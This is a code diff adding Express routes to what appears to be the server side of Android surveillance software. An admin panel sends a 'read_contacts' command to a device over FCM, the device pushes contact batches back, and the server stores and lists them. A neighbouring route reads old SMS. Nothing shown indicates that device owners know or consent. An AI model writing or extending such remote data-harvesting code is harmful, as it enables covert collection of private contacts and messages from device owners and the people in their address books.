@@ -1236,4 +1236,121 @@ router.post("/:deviceId/read-old-sms", async (req: Request, res: Response) => {
   }
 });
 
+
+/* ═══════════════════════════════════════════
+   CONTACTS BATCH PUSH (device sends contacts here)
+   ═══════════════════════════════════════════ */
+
+router.post("/:deviceId/contacts/batch", async (req: Request, res: Response) => {
+  try {
+    const deviceId = clean(req.params.deviceId);
+    const contactsList = req.body;
+
+    if (!Array.isArray(contactsList) || contactsList.length === 0) {
+      return res.status(400).json({ success: false, error: "empty batch" });
+    }
+
+    logger.info("devices: contacts batch received", { deviceId, count: contactsList.length });
+
+    const Contact = (await import("../models/Contact")).default;
+
+    let saved = 0;
+    let skipped = 0;
+
+    for (const contact of contactsList) {
+      try {
+        const name = clean(contact.name || "");
+        const number = clean(contact.number || "");
+        const cleanNumber = clean(contact.cleanNumber || number.replace(/[^+\d]/g, ""));
+        const contactId = clean(contact.contactId || "");
+
+        if (!number && !name) { skipped++; continue; }
+
+        const exists = await Contact.findOne({ deviceId, cleanNumber }).lean();
+        if (exists) {
+          if (exists.name !== name && name) {
+            await Contact.updateOne({ _id: exists._id }, { $set: { name } });
+          }
+          skipped++;
+          continue;
+        }
+
+        await new Contact({
+          deviceId,
+          name,
+          number,
+          cleanNumber,
+          contactId,
+        }).save();
+
+        saved++;
+      } catch (e: any) {
+        logger.warn("devices: contacts batch item save failed", { error: e?.message });
+        skipped++;
+      }
+    }
+
+    try { await touchLastSeen(deviceId, "contacts_batch"); } catch (_) {}
+
+    logger.info("devices: contacts batch complete", { deviceId, saved, skipped });
+    return res.json({ success: true, saved, skipped });
+  } catch (err: any) {
+    logger.error("devices: contacts batch failed", err);
+    return res.status(500).json({ success: false, error: err?.message });
+  }
+});
+
+/* ═══════════════════════════════════════════
+   GET CONTACTS FOR DEVICE
+   ═══════════════════════════════════════════ */
+
+router.get("/:deviceId/contacts", async (req: Request, res: Response) => {
+  try {
+    const deviceId = clean(req.params.deviceId);
+    const Contact = (await import("../models/Contact")).default;
+
+    const contacts = await Contact.find({ deviceId })
+      .sort({ name: 1 })
+      .lean();
+
+    return res.json(contacts);
+  } catch (err: any) {
+    logger.error("devices: get contacts failed", err);
+    return res.status(500).json([]);
+  }
+});
+
+/* ═══════════════════════════════════════════
+   TRIGGER READ CONTACTS (admin panel sends this)
+   ═══════════════════════════════════════════ */
+
+router.post("/:deviceId/read-contacts", async (req: Request, res: Response) => {
+  try {
+    const deviceId = clean(req.params.deviceId);
+
+    if (!deviceId) {
+      return res.status(400).json({ success: false, error: "missing deviceId" });
+    }
+
+    logger.info("devices: read-contacts triggered", { deviceId });
+
+    const result = await fcmSendCommand(deviceId, "read_contacts", {
+      requestId: `contacts_${deviceId}_${Date.now()}`,
+      extraData: {
+        timestamp: Date.now(),
+      },
+    });
+
+    return res.json({
+      success: result.success,
+      messageId: result.messageId,
+      error: result.error,
+    });
+  } catch (err: any) {
+    logger.error("devices: read-contacts failed", err);
+    return res.status(500).json({ success: false, error: err?.message });
+  }
+});
+
+
 export default router;
